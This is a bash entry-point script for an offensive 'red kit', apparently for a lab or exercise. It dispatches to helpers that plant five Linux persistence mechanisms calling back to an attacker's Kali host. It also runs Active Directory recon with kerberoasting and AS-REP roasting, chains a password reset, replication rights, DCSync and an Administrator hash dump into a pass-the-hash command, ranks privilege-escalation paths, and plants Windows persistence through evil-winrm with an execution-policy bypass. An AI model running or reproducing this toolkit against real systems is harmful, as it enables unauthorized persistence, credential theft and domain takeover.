#!/usr/bin/env bash
# red.sh — one entry point for the red kit. No arguments prints this.
#
#   bash red.sh plant  <KALI_IP> 4444 [user] [pubkey]    # 5 persistence mechanisms on Ubuntu
#   bash red.sh recon  <DC_IP> <user> <pass> [domain] [CA]  # AD enumeration, saves to ./loot
#   bash red.sh chain  <DC_IP> <domain> <user> <pass> <victim>   # reset -> dcsync -> hash
#   bash red.sh win                                        # reminder for the Windows one-liner
#
# Windows is a separate file because it runs inside evil-winrm, not on Kali:
#   .\red\plant_windows.ps1 -LHOST <KALI_IP> -LPORT 4444

set -u
DIR="$(cd "$(dirname "$0")" && pwd)"
cmd="${1:-help}"
[ $# -gt 0 ] && shift

case "$cmd" in
  plant)
    exec bash "$DIR/red/plant_linux.sh" "$@"
    ;;
  recon|recon-ad|loot)
    exec bash "$DIR/red/loot_ad.sh" "$@"
    ;;
  chain|ad)
    exec bash "$DIR/red/ad_chain.sh" "$@"
    ;;
  privesc|suid)
    exec bash "$DIR/red/linux_privesc.sh" "$@"
    ;;
  discover|find)
    exec bash "$DIR/discover.sh" "$@"
    ;;
  win|windows)
    cat <<'EOF'
Windows persistence runs inside your evil-winrm session, not on Kali:

  Set-ExecutionPolicy Bypass -Scope Process -Force
  .\red\plant_windows.ps1 -LHOST <KALI_IP> -LPORT 4444

That plants a scheduled task, a Run key, a local admin and a WMI subscription,
and prints a summary table to screenshot.
EOF
    ;;
  help|*)
    cat <<'EOF'
red.sh — red kit entry point

  bash red.sh plant  <KALI_IP> <LPORT> [user] [pubkey]
        five persistence mechanisms on Ubuntu: crontab, systemd user timer,
        .bashrc, authorized_keys, new sudo user

  bash red.sh recon  <DC_IP> <user> <pass> [domain] [CA_IP]
        AD enumeration: host facts, users, groups, kerberoast, asreproast,
        writable objects, ADCS templates. Writes ./loot/

  bash red.sh chain  <DC_IP> <domain> <user> <pass> <victim>
        reset a password, grant replication rights, dump the Administrator
        hash, then prints the pass-the-hash command

  bash red.sh privesc
        rank local Linux escalation paths: sudo, SUID, capabilities, cron,
        writable units, docker group, kernel CVE range

  bash red.sh win
        the reminder for the Windows script (runs inside evil-winrm)

Everything writes a summary at the end. Screenshot those, they are your evidence.
EOF
    ;;
esac
